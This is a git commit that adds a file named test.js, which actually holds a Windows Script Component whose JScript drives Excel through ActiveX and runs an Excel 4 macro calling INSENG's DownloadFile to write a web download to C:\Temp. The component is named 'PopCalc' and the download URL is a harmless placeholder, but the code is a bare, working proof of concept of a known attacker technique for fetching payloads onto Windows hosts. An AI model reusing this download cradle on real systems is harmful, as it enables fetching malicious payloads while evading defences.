b9e88c7ce1b58387f3c604ef3f31c4412f6e321b
valen <lastleaf404@gmail.com>
2020-06-04 21:31:16 +0630

    Create test.js

---
+++ test.js
@@ -0,0 +1,10 @@
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+<![CDATA[
+ var o = new ActiveXObject("Excel.Application").ExecuteExcel4Macro("CALL(\"INSENG\",\"DownloadFile\",\"BCCJ\",\"https://google.com\",\"C:\\Temp\\google.html\",1)");window.close();
+]]>
+</script>
+</component>
+</package>
